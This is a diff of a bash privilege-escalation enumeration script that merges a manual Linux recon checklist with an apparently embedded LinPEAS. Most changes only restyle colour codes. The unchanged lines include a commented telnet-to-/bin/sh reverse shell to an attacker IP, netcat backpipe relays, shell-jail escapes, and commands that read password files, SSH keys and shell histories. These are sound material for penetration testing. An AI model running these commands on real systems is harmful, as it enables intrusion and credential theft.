+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What's the Kernel version? Is it 64-bit? ${BRed}]${BYellow}╼▰ "
 
     cat /proc/version
     uname -a
@@ -1709,7 +1692,7 @@ LinPrivPro(){
     dmesg | grep Linux
     ls /boot | grep vmlinuz-
 
-    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What can be learnt from the environmental variables? ${BRed}]${BGreen}──╼"
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What can be learnt from the environmental variables? ${BRed}]${BYellow}╼▰ "
 
     cat /etc/profile
     cat /etc/bashrc
@@ -1719,21 +1702,21 @@ LinPrivPro(){
     env
     set
 
-    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼"
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰ "
     lpstat -a
 
-    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Applications & Services ${BRed}]${BGreen}──╼  What services are running? Which service has which user privilege? "
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Applications & Services ${BRed}]${BYellow}╼▰   What services are running? Which service has which user privilege? "
     ps aux
     ps -ef
     top
     cat /etc/service
 
-    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Which service(s) are been running by root? Of these services, which are vulnerable ${BRed}]${BGreen}──╼ it's worth a double check!"
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Which service(s) are been running by root? Of these services, which are vulnerable ${BRed}]${BYellow}╼▰  it's worth a double check!"
 
     ps aux | grep root
     ps -ef | grep root
 
-    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+    echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
     What applications are installed? What version are they? Are they currently running?"
 #
 # ls -alh /usr/bin/
@@ -1743,7 +1726,7 @@ LinPrivPro(){
 # ls -alh /var/cache/apt/archivesO
 # ls -alh /var/cache/yum/
 #
-#     echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Any of the service(s) settings misconfigured? ${BRed}]${BGreen}──╼ Are any (vulnerable) plugins attached?"
+#     echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} Any of the service(s) settings misconfigured? ${BRed}]${BYellow}╼▰  Are any (vulnerable) plugins attached?"
 #
 # cat /etc/syslog.conf
 # cat /etc/chttp.conf
@@ -1756,7 +1739,7 @@ LinPrivPro(){
 # cat /opt/lampp/etc/httpd.conf
 # # ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
 #
-#     echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What jobs are scheduled? ${BRed}]${BGreen}──╼ "
+#     echo "    ${DGrey}|──╼ ${BRed}[${ORANGE} What jobs are scheduled? ${BRed}]${BYellow}╼▰  "
 # crontab -l
 # ls -alh /var/spool/cron
 # ls -al /etc/ | grep cron
@@ -1770,7 +1753,7 @@ LinPrivPro(){
 # cat /etc/anacrontab
 # cat /var/spool/cron/crontabs/root
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Any plain text usernames and/or passwords?
 # grep -i user [filename]
@@ -1778,15 +1761,15 @@ LinPrivPro(){
 # grep -C 5 "password" [filename]
 # find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
-# Communications & Networking
+# Communications & NetWorKing
 # What NIC(s) does the system have? Is it connected to another network?
 # /sbin/ifconfig -a
 # cat /etc/network/interfaces
 # cat /etc/sysconfig/network
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # What are the network configuration settings? What can you find out about this network? DHCP server? DNS server? Gateway?
 # cat /etc/resolv.conf
@@ -1796,7 +1779,7 @@ LinPrivPro(){
 # hostname
 # dnsdomainname
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # What other users & hosts are communicating with the system?
 # lsof -i
@@ -1810,20 +1793,20 @@ LinPrivPro(){
 # last
 # w
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Whats cached? IP and/or MAC addresses
 # arp -e
 # route
 # /sbin/route -nee
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Is packet sniffing possible? What can be seen? Listen to live traffic
 # # tcpdump tcp dst [ip] [port] and tcp dst [ip] [port]
 # tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.2.2.222 21
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Have you got a shell? Can you interact with the system?
 # # http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/
@@ -1831,38 +1814,38 @@ LinPrivPro(){
 # nc -lvp 4445    # Attacker. Ouput (Results)
 # telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Is port forwarding possible? Redirect and interact with traffic from another view
 # # rinetd
 # # http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # # fpipe
 # # FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
 # FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # # ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
 # ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
 # ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # # mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
 # mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
 # mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
 # mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Is tunnelling possible? Send commands locally, remotely
 # ssh -D 127.0.0.1:9050 -N [username]@[ip]
 # proxychains ifconfig
 #
-#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+#     ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Confidential Information & Users
 # Who are you? Who is logged in? Who has been logged in? Who else is there? Who can do what?
@@ -1876,7 +1859,7 @@ LinPrivPro(){
 # cat /etc/sudoers
 # sudo -l
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # What sensitive files can be found?
 # cat /etc/passwd
@@ -1885,21 +1868,21 @@ LinPrivPro(){
 # ls -alh /var/mail/
 #
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Anything "interesting" in the home directorie(s)? If its possible to access
 # ls -ahlR /root/
 # ls -ahlR /home/
 #
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Are there any passwords in; scripts, databases, configuration files or log files? Default paths and locations for passwords
 # cat /var/apache2/config.inc
 # cat /var/lib/mysql/mysql/user.MYD
 # cat /root/anaconda-ks.cfg
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # What has the user being doing? Is there any password in plain text? What have they been edting?
 # cat ~/.bash_history
@@ -1908,7 +1891,7 @@ LinPrivPro(){
 # cat ~/.mysql_history
 # cat ~/.php_history
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # What user information can be found?
 # cat ~/.bashrc
@@ -1916,7 +1899,7 @@ LinPrivPro(){
 # cat /var/mail/root
 # cat /var/spool/mail/root
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Can private-key information be found?
 # cat ~/.ssh/authorized_keys
@@ -1935,7 +1918,7 @@ LinPrivPro(){
 # cat /etc/ssh/ssh_host_key.pub
 # cat /etc/ssh/ssh_host_key
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # File Systems
 # Which configuration files can be written in /etc/? Able to reconfigure a service?
@@ -1947,7 +1930,7 @@ LinPrivPro(){
 # find /etc/ -readable -type f 2>/dev/null                         # Anyone
 # find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # What can be found in /var/ ?
 # ls -alh /var/log
@@ -1958,7 +1941,7 @@ LinPrivPro(){
 # ls -alh /var/lib/mysql
 # cat /var/lib/dhcp3/dhclient.leases
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Any settings/files (hidden) on website? Any settings file with database information?
 # ls -alhR /var/www/
@@ -1967,7 +1950,7 @@ LinPrivPro(){
 # ls -alhR /opt/lampp/htdocs/
 # ls -alhR /var/www/html/
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Is there anything in the log file(s) (Could help with "Local File Includes"!)
 # # http://www.thegeekstuff.com/2011/08/linux-var-log-files/
@@ -2011,43 +1994,43 @@ LinPrivPro(){
 # ls -alh /var/log/samba/
 # # auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # If commands are limited, you break out of the "jail" shell?
 # python -c 'import pty;pty.spawn("/bin/bash")'
 # echo os.system('/bin/bash')
 # /bin/sh -i
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # How are file-systems mounted?
 # mount
 # df -h
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Are there any unmounted file-systems?
 # cat /etc/fstab
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # What "Advanced Linux File Permissions" are used? Sticky bits, SUID & GUID
 # find / -perm -1000 -type d 2>/dev/null    # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here
 # find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the  group, not the user who started it.
 # find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the  owner, not the user who started it.
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
 # for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # # find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
 # find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
 #
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Where can written to and executed from? A few 'common' places: /tmp, /var/tmp, /dev/shm
 # find / -writable -type d 2>/dev/null        # world-writeable folders
@@ -2058,13 +2041,13 @@ LinPrivPro(){
 #
 # find / \( -perm -o+w -perm -o+x \) -type d 2>/dev/null   # world-writeable & executable folders
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Any "problem" files? Word-writeable, "nobody" files
 # find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
 # find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Preparation & Finding Exploit Code
 # What development tools/languages are installed/supported?
@@ -2073,7 +2056,7 @@ LinPrivPro(){
 # find / -name gcc*
 # find / -name cc
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # How can files be uploaded?
 # find / -name wget
@@ -2082,7 +2065,7 @@ LinPrivPro(){
 # find / -name tftp*
 # find / -name ftp
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Finding exploit code
 # http://www.exploit-db.com
@@ -2095,7 +2078,7 @@ LinPrivPro(){
 # http://seclists.org/fulldisclosure/
 # http://www.google.com
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # Finding more information regarding the exploit
 # http://www.cvedetails.com
@@ -2103,7 +2086,7 @@ LinPrivPro(){
 # http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]
 # http://www.vulnview.com/cve-details.php?cvename=[CVE]
 #
-# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BGreen}──╼
+# ${DGrey}|──╼ ${BRed}[${ORANGE} Is there a printer? ${BRed}]${BYellow}╼▰
 #
 # (Quick) "Common" exploits. Warning. Pre-compiled binaries files. Use at your own risk
 # http://tarantula.by.ru/localroot/
@@ -2150,11 +2133,11 @@ FunLinPEAS(){
   NOCOLOR=""
   VERBOSE=""
   AUTO_NETWORK_SCAN=""
-  THREADS="$( ( (grep -c processor /proc/cpuinfo 2>/dev/null) || ( (command -v lscpu >/dev/null 2>&1) && (lscpu | grep '^CPU(s):' | awk '{print $2}')) || echo -n 2) | tr -d "\n")"
+  THREADS="$( ( (grep -c processor /proc/cpuinfo 2>/dev/null) || ( (command -v lscpu >/dev/null 2>&1) && (lscpu | grep '^CPU(s):' | awk '{print $2}')) || echo 2) | tr -d "\n")"
   [ -z "$THREADS" ] && THREADS="2" #If THREADS is empty, put number 2
   [ -n "$THREADS" ] && THREADS="2" #If THREADS is null, put number 2
   [ "$THREADS" -eq "$THREADS" ] 2>/dev/null && : || THREADS="2" #It THREADS is not a number, put number 2
-  HELP=$GREEN"Enumerate and search Privilege Escalation vectors.
+  HELP=${BGreen}"Enumerate and search Privilege Escalation vectors.
   ${NC}This tool enum and search possible misconfigurations$DG (known vulns, user, processes and file permissions, special file permissions, readable/writable files, bruteforce other users(top1000pwds), passwords...)$NC inside the host and highlight possible misconfigurations with colors.
         ${YELLOW}-h${BLUE} To show this message
         ${YELLOW}-q${BLUE} Do not show banner
@@ -2172,7 +2155,7 @@ FunLinPEAS(){
         ${YELLOW}-p <PORT(s)> -d <IP/NETMASK>${BLUE} Discover hosts looking for TCP open ports (via nc). By default ports 22,80,443,445,3389 and another one indicated by you will be scanned (select 22 if you don't want to add more). You can also add a list of ports.$DG Ex: -d 192.168.0.1/24 -p 53,139
         ${YELLOW}-i <IP> [-p <PORT(s)>]${BLUE} Scan an IP using nc. By default (no -p), top1000 of nmap will be scanned, but you can select a list of ports instead.$DG Ex: -i 127.0.0.1 -p 53,80,443,8000,8080
         ${YELLOW}-t${BLUE} Automatic network scan (host discovery and port scanning) - This option writes to files
-        $GREEN Notice${BLUE} that if you select some network action, no PE check will be performed$NC"
+        ${BGreen} Notice${BLUE} that if you select some network action, no PE check will be performed$NC"
 
   while getopts "h?asnd:p:i:P:qo:LMwNvt" opt; do
     case "$opt" in
@@ -2630,10 +2613,10 @@ FunLinPEAS(){
   FPING=$(command -v fping 2>/dev/null)
   PING=$(command -v ping 2>/dev/null)
   if [ "$FPING" ]; then
-    DISCOVER_BAN_GOOD="$GREEN$FPING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
+    DISCOVER_BAN_GOOD="${BGreen}$FPING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
   else
     if [ "$PING" ]; then
-      DISCOVER_BAN_GOOD="$GREEN$PING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
+      DISCOVER_BAN_GOOD="${BGreen}$PING${BLUE} is available for network discovery$LG ($SCRIPTNAME can discover hosts, learn more with -h)"
     fi
   fi
 
@@ -2652,7 +2635,7 @@ FunLinPEAS(){
     FOUND_NC=$(command -v nc.openbsd 2>/dev/null);
   fi
   if [ "$FOUND_NC" ]; then
-    SCAN_BAN_GOOD="$GREEN$FOUND_NC${BLUE} is available for network discover & port scanning$LG ($SCRIPTNAME can discover hosts and scan ports, learn more with -h)"
+    SCAN_BAN_GOOD="${BGreen}$FOUND_NC${BLUE} is available for network discover & port scanning$LG ($SCRIPTNAME can discover hosts and scan ports, learn more with -h)"
   fi
 
 
@@ -2690,7 +2673,7 @@ FunLinPEAS(){
       START_T1_TIME=$(date +%s 2>/dev/null)
     fi
 
-    printf ${BLUE}"════════════════════════════════════╣ $GREEN$1${BLUE} ╠════════════════════════════════════\n"$NC
+    printf ${BLUE}"════════════════════════════════════╣ ${BGreen}$1${BLUE} ╠════════════════════════════════════\n"$NC
   }
 
   print_2title(){
@@ -2705,15 +2688,15 @@ FunLinPEAS(){
       START_T2_TIME=$(date +%s 2>/dev/null)
     fi
 
-    printf ${BLUE}"╔══════════╣ $GREEN$1\n"$NC #There are 10 "═"
+    printf ${BLUE}"╔══════════╣ ${BGreen}$1\n"$NC #There are 10 "═"
   }
 
   print_3title(){
-    printf ${BLUE}"══╣ $GREEN$1\n"$NC #There are 2 "═"
+    printf ${BLUE}"══╣ ${BGreen}$1\n"$NC #There are 2 "═"
   }
 
   print_list(){
-    printf ${BLUE}"═╣ $GREEN$1"$NC #There is 1 "═"
+    printf ${BLUE}"═╣ ${BGreen}$1"$NC #There is 1 "═"
   }
 
   print_info(){
@@ -2878,7 +2861,7 @@ FunLinPEAS(){
     NETMASK=$(echo "$DISCOVERY" | cut -d "/" -f 2)
 
     if [ -z "$IP" ] || [ -z "$NETMASK" ]; then
-      printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24"$NC;
+      printf ${BRed}"[-] Err: Bad format. Example: 127.0.0.1/24"$NC;
       printf ${BLUE}"$HELP"$NC;
       exit 0
     fi
@@ -2890,18 +2873,18 @@ FunLinPEAS(){
     #Loop using ping
     else
       if [ "$NETMASK" -eq "24" ]; then
-        printf ${YELLOW}"[+]$GREEN Netmask /24 detected, starting...\n$NC"
+        printf ${YELLOW}"[+]${BGreen} Netmask /24 detected, starting...\n$NC"
         icmp_recon $IP
 
       elif [ "$NETMASK" -eq "16" ]; then
-        printf ${YELLOW}"[+]$GREEN Netmask /16 detected, starting...\n$NC"
+        printf ${YELLOW}"[+]${BGreen} Netmask /16 detected, starting...\n$NC"
         for i in $(seq 1 254)
         do
           NEWIP=$(echo "$IP" | cut -d "." -f 1,2).$i.1
           icmp_recon "$NEWIP"
         done
       else
-        printf $RED"[-] Err: Sorry, only Netmask /24 and /16 supported in ping mode. Netmask detected: $NETMASK"$NC;
+        printf ${BRed}"[-] Err: Sorry, only Netmask /24 and /16 supported in ping mode. Netmask detected: $NETMASK"$NC;
         exit 0
       fi
     fi
@@ -2920,9 +2903,9 @@ FunLinPEAS(){
     echo "Scanning: $DISCOVERY"
 
     if [ -z "$IP" ] || [ -z "$NETMASK" ] || [ "$IP" = "$NETMASK" ]; then
-      printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24\n"$NC;
+      printf ${BRed}"[-] Err: Bad format. Example: 127.0.0.1/24\n"$NC;
       if [ "$IP" = "$NETMASK" ]; then
-        printf $RED"[*] This options is used to find active hosts by scanning ports. If you want to perform a port scan of a host use the options: ${YELLOW}-i <IP> [-p <PORT(s)>]\n\n"$NC;
+        printf ${BRed}"    [*]  This options is used to find active hosts by scanning ports. If you want to perform a port scan of a host use the options: ${YELLOW}-i <IP> [-p <PORT(s)>]\n\n"$NC;
       fi
       printf ${BLUE}"$HELP"$NC;
       exit 0
@@ -2932,18 +2915,18 @@ FunLinPEAS(){
     PORTS=$(echo "$PORTS" | tr " " "\n" | sort -u) #Delete repetitions
 
     if [ "$NETMASK" -eq "24" ]; then
-      printf ${YELLOW}"[+]$GREEN Netmask /24 detected, starting...\n" $NC
+      printf ${YELLOW}"[+]${BGreen} Netmask /24 detected, starting...\n" $NC
       tcp_recon "$IP" "$PORTS"
 
     elif [ "$NETMASK" -eq "16" ]; then
-      printf ${YELLOW}"[+]$GREEN Netmask /16 detected, starting...\n" $NC
+      printf ${YELLOW}"[+]${BGreen} Netmask /16 detected, starting...\n" $NC
       for i in $(seq 0 255)
       do
         NEWIP=$(echo "$IP" | cut -d "." -f 1,2).$i.1
         tcp_recon "$NEWIP" "$PORTS"
       done
     else
-        printf $RED"[-] Err: Sorry, only netmask /24 and /16 are supported in port discovery mode. Netmask detected: $NETMASK\n"$NC;
+        printf ${BRed}"[-] Err: Sorry, only netmask /24 and /16 are supported in port discovery mode. Netmask detected: $NETMASK\n"$NC;
         exit 0
     fi
   }
@@ -3100,16 +3083,16 @@ FunLinPEAS(){
   if [ "$DISCOVER_BAN_GOOD" ]; then
     printf $YELLOW"[+] $DISCOVER_BAN_GOOD\n$NC"
   else
-    printf $RED"[-] $DISCOVER_BAN_BAD\n$NC"
+    printf ${BRed}"[-] $DISCOVER_BAN_BAD\n$NC"
   fi
 
   if [ "$SCAN_BAN_GOOD" ]; then
     printf $YELLOW"[+] $SCAN_BAN_GOOD\n$NC"
   else
-    printf $RED"[-] $SCAN_BAN_BAD\n$NC"
+    printf ${BRed}"[-] $SCAN_BAN_BAD\n$NC"
   fi
   if [ "$(command -v nmap 2>/dev/null)" ];then
-    NMAP_GOOD=$GREEN"nmap${BLUE} is available for network discover & port scanning, you should use it yourself"
+    NMAP_GOOD=${BGreen}"nmap${BLUE} is available for network discover & port scanning, you should use it yourself"
     printf $YELLOW"[+] $NMAP_GOOD\n$NC"
   fi
   echo ""
@@ -3121,8 +3104,8 @@ FunLinPEAS(){
 
   if [ "$PORTS" ]; then
     if [ "$SCAN_BAN_GOOD" ]; then
-      if [ "$(echo -n $PORTS | sed 's,[0-9, ],,g')" ]; then
-        printf $RED"[-] Err: Symbols detected in the port, for discovering purposes select only 1 port\n"$NC;
+      if [ "$(echo $PORTS | sed 's,[0-9, ],,g')" ]; then
+        printf ${BRed}"[-] Err: Symbols detected in the port, for discovering purposes select only 1 port\n"$NC;
         printf ${BLUE}"$HELP"$NC;
         exit 0
       else
@@ -3130,7 +3113,7 @@ FunLinPEAS(){
         select_nc
       fi
     else
-      printf $RED"  Err: Port scan not possible, any netcat in PATH\n"$NC;
+      printf ${BRed}"  Err: Port scan not possible, any netcat in PATH\n"$NC;
       printf ${BLUE}"$HELP"$NC;
       exit 0
     fi
@@ -3143,7 +3126,7 @@ FunLinPEAS(){
       if [ "$DISCOVER_BAN_GOOD" ]; then
         discover_network $DISCOVERY
       else
-        printf $RED"  Err: Discovery not possible, no fping or ping in PATH\n"$NC;
+        printf ${BRed}"  Err: Discovery not possible, no fping or ping in PATH\n"$NC;
       fi
     fi
     exit 0
@@ -3161,7 +3144,7 @@ FunLinPEAS(){
 
   if echo $CHECKS | grep -q ProCronSrvcsTmrsSocks || echo $CHECKS | grep -q IntFiles || echo $CHECKS | grep -q SofI; then
 
-    printf $GREEN"Caching directories "$NC
+    printf ${BGreen}"Caching directories "$NC
 
 
     #Get home
@@ -3491,7 +3474,7 @@ FunLinPEAS(){
     if [ -z "$ASLR" ]; then
       echo_not_found "/proc/sys/kernel/randomize_va_space";
     else
-      if [ "$ASLR" -eq "0" ]; then printf $RED"No"$NC; else printf $GREEN"Yes"$NC; fi
+      if [ "$ASLR" -eq "0" ]; then printf ${BRed}"No"$NC; else printf ${BGreen}"Yes"$NC; fi
       echo ""
     fi
 
@@ -3504,9 +3487,9 @@ FunLinPEAS(){
     hypervisorflag=$(grep flags /proc/cpuinfo 2>/dev/null | grep hypervisor)
     if [ "$(command -v systemd-detect-virt 2>/dev/null)" ]; then
       detectedvirt=$(systemd-detect-virt)
-      if [ "$hypervisorflag" ]; then printf $RED"Yes ($detectedvirt)"$NC; else printf $GREEN"No"$NC; fi
+      if [ "$hypervisorflag" ]; then printf ${BRed}"Yes ($detectedvirt)"$NC; else printf ${BGreen}"No"$NC; fi
     else
-      if [ "$hypervisorflag" ]; then printf $RED"Yes"$NC; else printf $GREEN"No"$NC; fi
+      if [ "$hypervisorflag" ]; then printf ${BRed}"Yes"$NC; else printf ${BGreen}"No"$NC; fi
     fi
     echo ""
     echo ""
@@ -3718,7 +3701,7 @@ FunLinPEAS(){
     #-- PCS) Cleaned proccesses
     print_2title "Cleaned processes"
     if [ "$NOUSEPS" ]; then
-      printf ${BLUE}"[i]$GREEN Looks like ps is not finding processes, going to read from /proc/ and not going to monitor 1min of processes\n"$NC
